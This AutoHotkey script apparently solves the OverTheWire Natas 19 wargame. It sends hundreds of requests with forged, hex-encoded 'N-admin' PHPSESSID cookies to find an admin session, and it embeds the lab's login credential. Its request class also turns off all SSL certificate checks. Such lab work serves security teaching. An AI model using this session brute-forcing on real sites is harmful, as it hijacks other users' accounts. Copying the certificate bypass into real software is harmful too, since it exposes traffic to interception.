; Link:   	
; Author:	
; Date:   	
; for:     	AHK_L

/*


*/

requests := object()

loop, 643
{
	
	tooltip, % "sending request " A_Index - 3
	request := new WebRequest("http://natas19.natas.labs.overthewire.org/index.php")
	;~ request.addGet("debug", "true")
	request.setCredentials("natas19", "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs")
	;~ request.addPost("username", "admin")
	;~ request.addPost("password", "password")
	request.setTimeout(20000)
	request.addCookie("PHPSESSID", AscToHex(A_Index - 3 "-admin"))
	request.goGet()
	.addMisc(A_Index - 3)
	requests[A_Index] := request
}
waitForAllResponses(requests) 

strings := object()

tooltip, Sorting responses
for index, r in requests
{
	;go through every response
	if(strings.hasKey(r.getResponse())) {
		strings[r.getResponse()] .= ", " r.getMisc()
	} else {
		strings[r.getResponse()] := r.getMisc()
	}
}

for resp, values in strings 
{
	FileAppend, % values "`n" resp, % A_index ".txt"
}


ExitApp

AscToHex(str) {
	if(str)
	{
		str := Chr((Asc(str)>>4)+48) Chr((x:=Asc(str)&15)+(x>9 ? 55:48)) AscToHex(SubStr(str,2))
	}
	StringLower, str, str
	return str
}
waitForAllResponses(respArr) {
	for index, r in respArr
	{
		while true
		{
			tooltip, % "waiting for " index " to respond"
			if(r.isReady()) 
			{ 
				break
			}
			sleep 50
		}
	}
	return
}

#c::
ExitApp

class WebRequest {
	HTTPREQUEST_SETCREDENTIALS_FOR_SERVER := 0
	HTTPREQUEST_SETCREDENTIALS_FOR_PROXY := 1
	url := ""
	getVars :=  Object()
	postVars :=  Object()
	cookies := Object()
	header := Object()
	requestObj := ComObjCreate("WinHttp.WinHttpRequest.5.1")
	response := ""
	username := ""
	password := ""
	throttle := true
	serverOrProxy := ""

	/* Assumes a valid url
	 */
	__New(url) {
		this.url := url
		return this
	}
	
	addMisc(item) {
		this.item := item
	}
	
	getMisc() {
		return this.item
	}
	
	setThrottle(bool) {
		this.throttle := bool
		return this
	}
	
	removeHeader(key) {
		this.headers.Remove(key)
		return this
	}
	
	removePost(key) {
		this.postVars.Remove(key)
		return this
	}
	isReady() {
		return this.requestObj.waitForResponse(1)
	}
	/*
	 * Ensure isReady before calling this
	 */
	getResponse() {
		return this.requestObj.responseText
	}
	
	makeUri() {
		safeUri := this.url
		for key, val in % this.getVars {
			safeUri .= "?" this.UriEncode(key) "=" this.UriEncode(val)
		}
		;~ MsgBox, % "Uri is " safeUri
		return safeUri
	}
	
	makeData() {
		data := ""
		for key, val in this.postVars {
			data .= this.UriEncode(key) "=" this.UriEncode(val) "&"
		}
		StringTrimRight, data, data, 1
		;~ msgbox, % "data is " data
		return data
	}
	
	goGet() {
		this.requestObj.Open("GET", this.makeUri(), this.throttle)
		this.__setHeaders()
		this.requestObj.Send()
		return this
	}
	
	__makeCookies() {
		str := ""
		for key, val in this.cookies {
			str .= this.UriEncode(key) "=" this.UriEncode(val) "&"
		}
		StringTrimRight, str, str, 1
		return str
	}
	
	/*
	 * called after open and before send
	 */
	__setHeaders(type := "") {
		if(this.timeout) {
			this.requestObj.setTimeouts(0, 30000, 30000, this.timeout)
		}
		if(this.username) {
			this.Base64encUTF8(encoded, this.username ":" this.password)
			this.requestObj.setRequestHeader("Authorization", "Basic " encoded)
		}
		if(this.__MakeCookies()) {
			this.requestObj.setRequestHeader("Cookie", this.__makeCookies())
		}
		if(type == "POST") {
			this.requestObj.setRequestHeader("Content-type", "application/x-www-form-urlencoded")
		}
		for key, val in this.headers 
		{
			this.requestObj.setRequestHeader(key, value)
		}	
		this.requestObj.option(4) := 13056 ; WinHttpRequestOption_SslErrorIgnoreFlags 13056: ignore all err, 0: accept no err
		;~ this.requestObj.setRequestHeader("User-Agent", "Mozilla/5.0 (X11; Linux i686; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.5.0")
		;~ this.requestObj.setRequestHeader("Accept"
			;~ , "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
	}
	
	goPost() {
		this.requestObj.Open("POST", this.makeUri(), this.throttle)
		this.__setHeaders("POST")
		;~ MsgBox % this.makeUri()
		this.requestObj.Send(this.makeData())
		return this
	}
	
	addCookie(key, value) {
		this.cookies[key] := value
		return
	}
	
	setTimeout(miliseconds) {
		this.timeout := miliseconds
		return this
	}
	
	addGet(key, value) {
		this.getVars[key] := value
		return this
	}
	
	addPost(key, value) {
		this.postVars[key] := value
		return this
	}
	
	addHeader(key, value) {
		this.header[key] := value
		return this
	}
	
	/* serverOrProxy is one of the HTTPREQUEST_CREDENTIALS at the top of the class
	 */
	setCredentials(username, pass, serverOrProxy := 0) {
		this.userName := username
		this.password := pass
		this.ServerOrProxy := serverOrProxy
		return this
	}
	
	UriEncode(Uri, Enc := "UTF-8") {
		StringReplace, Uri, Uri, %A_Space%, +, ALL
		;~ MsgBox % Uri
		; modified from jackieku's code (http://www.autohotkey.com/forum/post-310959.html#310959) 
		this.StrPutVar(Uri, Var, Enc) 
		f := A_FormatInteger 
		SetFormat, IntegerFast, H 
		Loop, % StrLen(Uri)
		{ 
			Code := NumGet(Var, A_Index - 1, "UChar") 
			If (chr(Code) == "+") 
			{
				;~ this is the space character
				Res .= "+"
			}
			Else If (Code >= 0x30 && Code <= 0x39 ; 0-9 
					|| Code >= 0x41 && Code <= 0x5A ; A-Z 
					|| Code >= 0x61 && Code <= 0x7A) ; a-z 
				Res .= Chr(Code) 
			Else 
				Res .= "%" . SubStr(Code + 0x100, -1) 
		} 
		SetFormat, IntegerFast, %f% 
		Return, Res 
	} 
	
	Base64encUTF8( ByRef OutData, ByRef InData )
	{ ; by SKAN + my modifications to encode to UTF-8
	  InDataLen := this.StrPutVar(InData, InData, "UTF-8") - 1
	  DllCall( "Crypt32.dll\CryptBinaryToStringW", UInt,&InData, UInt,InDataLen, UInt,1, UInt,0, UIntP,TChars, "CDECL Int" )
	  VarSetCapacity( OutData, Req := TChars * ( A_IsUnicode ? 2 : 1 ), 0 )
	  DllCall( "Crypt32.dll\CryptBinaryToStringW", UInt,&InData, UInt,InDataLen, UInt,1, Str,OutData, UIntP,Req, "CDECL Int" )
	  Return TChars
	}

	StrPutVar(Str, ByRef Var, Enc = "") { 
	   Len := StrPut(Str, Enc) * (Enc = "UTF-16" || Enc = "CP1200" ? 2 : 1) 
	   VarSetCapacity(Var, Len, 0) 
	   Return, StrPut(Str, &Var, Enc) 
	}

}